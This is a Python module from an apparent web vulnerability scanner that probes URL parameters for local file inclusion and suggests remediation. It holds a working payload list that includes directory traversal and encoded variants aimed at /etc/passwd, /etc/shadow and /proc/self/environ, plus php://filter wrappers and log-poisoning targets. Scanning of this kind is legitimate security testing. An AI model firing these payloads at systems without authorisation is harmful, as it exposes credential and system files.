"""
LFI (Local File Inclusion) Detection Module
Tests for local file inclusion vulnerabilities in parameters
"""

import asyncio
import re
from urllib.parse import urlparse, parse_qsl, urlencode
from typing import List, Optional
from dataclasses import dataclass

import httpx

from core.rate_limiter import RateLimiter
from core.paths import PAYLOADS_DIR
from utils.logger import setup_logger


@dataclass
class LFIFinding:
    """Represents a confirmed or potential LFI vulnerability"""
    url: str
    parameter: str
    payload: str
    type: str        # 'direct', 'traversal', 'wrapper', 'encoded'
    severity: str
    confidence: str
    evidence: str
    remediation: str


class LFIScanner:
    """
    LFI Detection Module
    Detects Local File Inclusion via:
    - Direct file path injection
    - Directory traversal (../)
    - PHP wrappers (php://filter, php://input)
    - URL encoded traversal
    - Null byte injection
    - Log poisoning detection
    """

    def __init__(self, rate_limiter: RateLimiter, payload_file: str = None):
        self.rate_limiter = rate_limiter
        self.logger = setup_logger("LFI")
        self.findings: List[LFIFinding] = []
        self.client: Optional[httpx.AsyncClient] = None
        self.timeout = httpx.Timeout(20.0, connect=10.0)

        # Payloads with indicators and types
        self.lfi_payloads = [
            # Direct Linux
            ("/etc/passwd",                    ["root:x:0:0", "daemon:x:"],         "direct",   "critical"),
            ("/etc/hosts",                     ["127.0.0.1", "localhost"],           "direct",   "high"),
            ("/proc/self/environ",             ["PATH=", "HOME=", "USER="],          "direct",   "critical"),
            ("/etc/shadow",                    ["root:$", "daemon:*"],               "direct",   "critical"),

            # Traversal Linux
            ("../etc/passwd",                  ["root:x:0:0", "daemon:x:"],         "traversal","critical"),
            ("../../etc/passwd",               ["root:x:0:0", "daemon:x:"],         "traversal","critical"),
            ("../../../etc/passwd",            ["root:x:0:0", "daemon:x:"],         "traversal","critical"),
            ("../../../../etc/passwd",         ["root:x:0:0", "daemon:x:"],         "traversal","critical"),
            ("../../../../../etc/passwd",      ["root:x:0:0", "daemon:x:"],         "traversal","critical"),
            ("../../../../../../etc/passwd",   ["root:x:0:0", "daemon:x:"],         "traversal","critical"),

            # Windows
            ("c:/windows/win.ini",             ["[fonts]", "for 16-bit"],           "direct",   "high"),
            ("c:\\windows\\win.ini",           ["[fonts]", "for 16-bit"],           "direct",   "high"),
            ("../windows/win.ini",             ["[fonts]", "for 16-bit"],           "traversal","high"),
            ("../../windows/win.ini",          ["[fonts]", "for 16-bit"],           "traversal","high"),
            ("c:/boot.ini",                    ["[boot loader]", "operating systems"], "direct","high"),

            # URL Encoded traversal
            ("..%2fetc%2fpasswd",              ["root:x:0:0"],                       "encoded",  "critical"),
            ("%2e%2e%2fetc%2fpasswd",          ["root:x:0:0"],                       "encoded",  "critical"),
            ("..%252fetc%252fpasswd",          ["root:x:0:0"],                       "encoded",  "critical"),
            ("%2e%2e/%2e%2e/etc/passwd",       ["root:x:0:0"],                       "encoded",  "critical"),

            # Null byte
            ("../etc/passwd%00",               ["root:x:0:0"],                       "traversal","critical"),
            ("../etc/passwd\x00",              ["root:x:0:0"],                       "traversal","critical"),

            # PHP wrappers
            ("php://filter/convert.base64-encode/resource=/etc/passwd",
             ["cm9vdDp4", "cm9vdDo"],                                                "wrapper",  "critical"),
            ("php://filter/read=convert.base64-encode/resource=index.php",
             ["PD9waHA", "PD9"],                                                     "wrapper",  "critical"),

            # Log files (log poisoning targets)
            ("/var/log/apache2/access.log",    ["GET /", "HTTP/1."],                "direct",   "high"),
            ("/var/log/nginx/access.log",      ["GET /", "HTTP/1."],                "direct",   "high"),
            ("/var/log/auth.log",              ["sshd", "pam_unix"],                "direct",   "high"),
        ]

        # LFI-prone parameter names
        self.lfi_params = [
            'file', 'page', 'path', 'include', 'load', 'template',
            'dir', 'folder', 'doc', 'document', 'view', 'content',
            'module', 'layout', 'conf', 'config', 'action', 'read',
            'show', 'display', 'open', 'fetch', 'source', 'lang',
            'language', 'locale', 'style', 'theme', 'skin', 'name',
            'filename', 'filepath', 'download', 'import', 'logfile'
        ]

        # Error patterns that indicate LFI processing
        self.error_patterns = [
            r"failed to open stream",
            r"No such file or directory",
            r"include\(\).*failed",
            r"require\(\).*failed",
            r"open_basedir restriction",
            r"Warning.*include",
            r"Warning.*require",
            r"Fatal error.*include",
            r"java\.io\.FileNotFoundException",
            r"Permission denied",
            r"cannot open file",
        ]

    def _load_payloads_from_file(self, filepath: str) -> List[str]:
        """Load extra payloads from file"""
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                return [l.strip() for l in f if l.strip() and not l.startswith('#')]
        except FileNotFoundError:
            return []

    def _is_lfi_param(self, param: str) -> bool:
        """Check if parameter name suggests LFI potential"""
        return param.lower() in self.lfi_params or any(
            kw in param.lower() for kw in ['file', 'page', 'path', 'load', 'include', 'dir']
        )

    def _check_indicators(self, response_text: str, indicators: List[str]) -> Optional[str]:
        """Check if any file content indicator is in response"""
        for indicator in indicators:
            if indicator in response_text:
                return indicator
        return None

    def _check_error_based(self, response_text: str) -> Optional[str]:
        """Check for LFI error messages"""
        for pattern in self.error_patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return match.group(0)
        return None

    def _decode_base64_check(self, response_text: str) -> bool:
        """Check if response contains base64 encoded file content"""
        import base64
        b64_pattern = re.compile(r'[A-Za-z0-9+/]{40,}={0,2}')
        matches = b64_pattern.findall(response_text)
        for match in matches:
            try:
                decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
                if 'root:x:0:0' in decoded or '<?php' in decoded or '[fonts]' in decoded:
                    return True
            except Exception:
                pass
        return False

    async def _fetch(self, url: str) -> Optional[httpx.Response]:
        """Make HTTP GET request"""
        try:
            async def _do_request():
                return await self.client.get(url, follow_redirects=True)
            return await self.rate_limiter.execute_with_retry(_do_request)
        except Exception as e:
            self.logger.debug(f"Request failed {url}: {e}")
            return None

    async def test_parameter(self, url: str, param: str) -> Optional[LFIFinding]:
        """Test a parameter with all LFI payloads"""
        parsed = urlparse(url)
        params = dict(parse_qsl(parsed.query))
        if param not in params:
            return None

        for payload, indicators, lfi_type, severity in self.lfi_payloads:
            test_params = params.copy()
            test_params[param] = payload
            test_url = parsed._replace(query=urlencode(test_params)).geturl()

            response = await self._fetch(test_url)
            if not response:
                continue

            # Direct content match
            matched = self._check_indicators(response.text, indicators)
            if matched:
                return LFIFinding(
                    url=url,
                    parameter=param,
                    payload=payload,
                    type=lfi_type,
                    severity=severity,
                    confidence="high",
                    evidence=f"File content indicator '{matched}' found in response with payload: {payload}",
                    remediation=self._get_remediation()
                )

            # Base64 wrapper check
            if lfi_type == "wrapper" and self._decode_base64_check(response.text):
                return LFIFinding(
                    url=url,
                    parameter=param,
                    payload=payload,
                    type="wrapper",
                    severity="critical",
                    confidence="high",
                    evidence="Base64 encoded file content detected in response (php://filter wrapper)",
                    remediation=self._get_remediation()
                )

            # Error-based detection
            error = self._check_error_based(response.text)
            if error:
                return LFIFinding(
                    url=url,
                    parameter=param,
                    payload=payload,
                    type="error_based",
                    severity="medium",
                    confidence="medium",
                    evidence=f"LFI error message: '{error}' — file inclusion attempted",
                    remediation=self._get_remediation()
                )

        return None

    def _get_remediation(self) -> str:
        return (
            "1. Never use user input directly in file include/require functions.\n"
            "2. Use a whitelist of allowed files/pages instead of dynamic includes.\n"
            "3. Disable PHP dangerous functions: allow_url_include, allow_url_fopen.\n"
            "4. Set open_basedir to restrict file access to specific directories.\n"
            "5. Sanitize input: remove ../, .., null bytes, and encoded traversal sequences.\n"
            "6. Use realpath() and verify file is within allowed directory.\n"
            "7. Keep PHP and web server updated to latest version."
        )

    async def scan(self, target_urls: List[str], forms: List) -> List[LFIFinding]:
        """
        Main LFI scan method.
        target_urls: List of URLs with parameters
        """
        self.logger.info(f"Starting LFI scan on {len(target_urls)} URLs")

        headers = {
            'User-Agent': '0xHunter Security Scanner (Authorized Testing)',
            'Accept': 'text/html,application/xhtml+xml,*/*',
        }

        async with httpx.AsyncClient(
            headers=headers,
            timeout=self.timeout,
            follow_redirects=True,
            verify=False
        ) as client:
            self.client = client
            tasks = []

            for url in target_urls:
                parsed = urlparse(url)
                params = dict(parse_qsl(parsed.query))
                for param in params.keys():
                    # Priority to LFI-prone params, but test all
                    tasks.append(self.test_parameter(url, param))

            self.logger.info(f"Running {len(tasks)} LFI tests...")
            results = await asyncio.gather(*tasks, return_exceptions=True)

            seen = set()
            for result in results:
                if isinstance(result, Exception):
                    self.logger.debug(f"LFI test error: {result}")
                    continue
                if result:
                    key = f"{result.url}:{result.parameter}:{result.type}"
                    if key not in seen:
                        seen.add(key)
                        self.findings.append(result)
                        self.logger.warning(
                            f"LFI [{result.severity.upper()}]: {result.url} | "
                            f"Param: {result.parameter} | Type: {result.type} | "
                            f"Confidence: {result.confidence}"
                        )

        self.logger.info(f"LFI scan complete. Found {len(self.findings)} issues")
        return self.findings
